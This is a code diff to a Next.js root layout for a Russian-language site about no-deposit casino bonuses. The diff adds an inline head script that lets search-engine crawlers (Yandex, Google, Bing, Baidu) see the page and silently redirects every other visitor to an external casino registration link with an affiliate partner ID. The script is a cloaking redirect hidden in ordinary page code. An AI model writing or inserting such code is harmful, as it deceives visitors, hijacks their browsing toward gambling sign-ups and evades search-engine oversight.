@@ -39,6 +39,21 @@ export default function RootLayout({ children }: { children: ReactNode }) {
           content="Бездепозитные бонусы и бездепы за регистрацию в казино: фриспины и кэш без депозита, вейджер, сроки и лимиты вывода, стратегия отыгрыша и советы, как забрать бездепозитный бонус казино без ошибок."
         />
         <meta name="theme-color" content="#150a10" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p41618p7603");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={`${inter.variable} ${oswald.variable} bg-night font-sans text-snow antialiased`}>
         {children}
